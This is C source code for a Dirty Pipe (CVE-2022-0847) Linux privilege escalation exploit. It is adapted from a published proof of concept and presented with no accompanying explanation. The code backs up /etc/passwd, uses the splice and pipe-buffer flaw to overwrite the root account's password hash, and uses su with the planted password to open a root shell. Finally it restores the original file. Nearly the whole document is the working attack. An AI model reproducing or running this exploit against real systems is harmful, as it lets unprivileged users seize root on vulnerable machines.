/* SPDX-License-Identifier: GPL-2.0 */
/*
 * Copyright 2022 CM4all GmbH / IONOS SE * author: Max Kellermann <max.kellermann@ionos.com> */
#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

static void prepare_pipe(int p[2])
{
   if (pipe(p)) abort();

   const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
   static char buffer[4096];

   for (unsigned r = pipe_size; r > 0;) {
      unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
      write(p[1], buffer, n);
      r -= n;
   }

   for (unsigned r = pipe_size; r > 0;) {
      unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
      read(p[0], buffer, n);
      r -= n;
   }
}

int main() {
   const char *const path = "/etc/passwd";
        FILE *f1 = fopen("/etc/passwd", "r");
        FILE *f2 = fopen("/tmp/passwd.bak", "w");

        if (f1 == NULL) {
            printf("Failed to open /etc/passwd\n");
            exit(EXIT_FAILURE);
        } else if (f2 == NULL) {
            printf("Failed to open /tmp/passwd.bak\n");
            fclose(f1);
            exit(EXIT_FAILURE);
        }

        char c;
        while ((c = fgetc(f1)) != EOF)
            fputc(c, f2);

        fclose(f1);
        fclose(f2);

   loff_t offset = 4;
   const char *const data = ":$1$operator$Dp504558Al3GMak0EWiPJ/:0:0:test:/root:/bin/sh\n";
   const size_t data_size = strlen(data);

   if (offset % PAGE_SIZE == 0) {
      fprintf(stderr, "Sorry, cannot start writing at a page boundary\n");
      return EXIT_FAILURE;
   }

   const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
   const loff_t end_offset = offset + (loff_t)data_size;
   if (end_offset > next_page) {
      fprintf(stderr, "Sorry, cannot write across a page boundary\n");
      return EXIT_FAILURE;
   }

   const int fd = open(path, O_RDONLY);
   if (fd < 0) {
      perror("open failed");
      return EXIT_FAILURE;
   }

   struct stat st;
   if (fstat(fd, &st)) {
      perror("stat failed");
      return EXIT_FAILURE;
   }

   if (offset > st.st_size) {
      fprintf(stderr, "Offset is not inside the file\n");
      return EXIT_FAILURE;
   }

   if (end_offset > st.st_size) {
      fprintf(stderr, "Sorry, cannot enlarge the file\n");
      return EXIT_FAILURE;
   }

   int p[2];
   prepare_pipe(p);

   --offset;
   ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
   if (nbytes < 0) {
      perror("splice failed");
      return EXIT_FAILURE;
   }
   if (nbytes == 0) {
      fprintf(stderr, "short splice\n");
      return EXIT_FAILURE;
   }

   nbytes = write(p[1], data, data_size);
   if (nbytes < 0) {
      perror("write failed");
      return EXIT_FAILURE;
   }
   if ((size_t)nbytes < data_size) {
      fprintf(stderr, "short write\n");
      return EXIT_FAILURE;
   }

   char *argv[] = {"/bin/sh", "-c", "(echo aaron; cat) | su - -c \""
 "cp /tmp/passwd.bak /etc/passwd;" "/bin/sh;" "\" root"};
        execv("/bin/sh", argv);
        printf("system() function call seems to have failed :(\n");
   return EXIT_SUCCESS;
}
